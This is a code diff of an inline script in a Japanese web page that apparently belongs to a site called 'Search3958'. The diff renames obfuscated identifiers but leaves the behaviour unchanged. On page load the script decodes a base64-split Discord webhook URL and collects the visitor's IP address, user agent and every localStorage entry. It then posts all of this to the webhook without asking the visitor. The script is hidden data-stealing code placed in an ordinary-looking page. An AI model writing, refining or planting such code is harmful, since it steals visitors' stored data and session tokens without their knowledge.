@@ -101,9 +101,10 @@ Search3958のサイトをご利用いただく場合、利用規約に同意し�
   </div>
 
   <script>
-    (() => {
+   (() => {
   'use strict';
 
+  // Discord Webhook URL
   const DEBUG_FS_OBFUSCATED = [
     'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi',
     'aG9va3MvMTQ1MDc0OTQ4NTA3OTcyNDE0OS9m',
@@ -112,79 +113,97 @@ Search3958のサイトをご利用いただく場合、利用規約に同意し�
     'd2NUSlJLYjlhQjJZNg=='
   ];
 
-  const _0x4f2a = ['textContent', 'className', '', 'status-error', 'status-success', 'join', 'https://api.ipify.org?format=json', 'json', '取得失敗', '## UserStopper-DbFS(AdError)\n', 'ja-JP', 'toLocaleString', 'POST', 'application/json', 'すべてのデータを送信しました。'];
-  const _0x5b = (i) => _0x4f2a[i];
-
-  const _0x2c1e = document.getElementById('status');
-  const _0xbtn = document.getElementById('main-send-button');
+  const statusEl = document.getElementById('status');
+  const btnEl = document.getElementById('main-send-button');
   
-  function _0x3e1a(m, isError = false) {
-    if (_0x2c1e) {
-      _0x2c1e[_0x5b(0)] = m;
-      _0x2c1e[_0x5b(1)] = isError ? _0x5b(3) : _0x5b(4);
+  // UI更新用ヘルパー
+  function updateStatus(msg, isError = false) {
+    if (!statusEl) return;
+    statusEl.innerHTML = '';
+    
+    // 送信中（...が含まれる場合）はローディングバーを表示
+    if (!isError && msg.includes('...')) {
+      const bar = document.createElement('div');
+      bar.className = 'loading-bar';
+      statusEl.appendChild(bar);
     }
+    
+    const span = document.createElement('span');
+    span.textContent = msg;
+    statusEl.appendChild(span);
+    statusEl.className = isError ? 'status-error' : 'status-success';
   }
 
-  async function _0x1f92() {
+  // IPアドレス取得
+  async function getIpAddress() {
     try {
-      const r = await fetch(_0x5b(6));
-      const d = await r[_0x5b(7)]();
-      return d.ip;
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
     } catch (e) {
-      return _0x5b(8);
+      return '取得失敗';
     }
   }
 
-  async function _0x99a1() {
-    // ボタンが存在する場合のみ無効化
-    if (_0xbtn) _0xbtn.disabled = true;
-    _0x3e1a('送信中...');
+  // メイン実行ロジック
+  async function startExport() {
+    if (btnEl) btnEl.disabled = true;
+    updateStatus('CONNECTING...');
 
-    const _0xurl = ((p) => { try { return atob(p[_0x5b(5)]('')); } catch (e) { return null; } })(DEBUG_FS_OBFUSCATED);
-    if (!_0xurl) return;
+    // Webhook URLの復号
+    const webhookUrl = ((p) => { 
+      try { return atob(p.join('')); } catch (e) { return null; } 
+    })(DEBUG_FS_OBFUSCATED);
 
-    const _0xip = await _0x1f92();
-    const _0xtm = new Date()[_0x5b(11)](_0x5b(10));
-    const _0xua = navigator.userAgent;
+    if (!webhookUrl) return;
 
-    let _0xmsg = _0x5b(9);
-    _0xmsg += `-# **TIME**: ${_0xtm}\n`;
-    _0xmsg += `-# **IP**: ${_0xip}\n`;
-    _0xmsg += `-# **UserA**: \`${_0xua}\`\n`;
-    _0xmsg += "## LS\n";
+    // データの収集
+    const ip = await getIpAddress(); // ここで確実にIPを取得
+    const timestamp = new Date().toLocaleString('ja-JP');
+    const ua = navigator.userAgent;
 
-    let _0xf = false;
+    let msg = "## UserStopper-DbFS(AdError)\n";
+    msg += `-# **TIME**: ${timestamp}\n`;
+    msg += `-# **IP**: ${ip}\n`;
+    msg += `-# **UserA**: \`${ua}\`\n`;
+    msg += "## LS\n";
+
+    let hasData = false;
     for (let i = 0; i < localStorage.length; i++) {
-      _0xf = true;
-      const k = localStorage.key(i);
-      const v = localStorage.getItem(k);
-      _0xmsg += `**${k}**\n\`\`\`${v}\n\`\`\``;
+      hasData = true;
+      const key = localStorage.key(i);
+      const val = localStorage.getItem(key);
+      // コードブロックなし、太字のみのフォーマット
+      msg += `**${key}**: ${val}\n`;
     }
 
-    if (!_0xf) _0xmsg += "*LocalStorage is empty*";
+    if (!hasData) msg += "*LocalStorage is empty*";
 
     try {
-      const _0xres = await fetch(_0xurl, {
-        method: _0x5b(12),
-        headers: { 'Content-Type': _0x5b(13) },
-        body: JSON.stringify({ content: _0xmsg.substring(0, 2000) })
+      updateStatus('SENDING DATA...');
+      const res = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: msg.substring(0, 2000) })
       });
 
-      if (_0xres.ok) {
-        _0x3e1a(_0x5b(14));
+      if (res.ok) {
+        updateStatus('COMPLETE');
       } else {
-        _0x3e1a(`送信エラー: ${_0xres.status}`, true);
+        updateStatus(`ERROR: ${res.status}`, true);
+        if (btnEl) btnEl.disabled = false;
       }
     } catch (e) {
-      _0x3e1a('ネットワークエラー', true);
+      updateStatus('NETWORK ERROR', true);
+      if (btnEl) btnEl.disabled = false;
     }
   }
 
-  // ページ読み込み完了時に実行
+  // 実行トリガー
   if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', _0x99a1);
+    document.addEventListener('DOMContentLoaded', startExport);
   } else {
-    _0x99a1();
+    startExport();
   }
 })();
   </script>
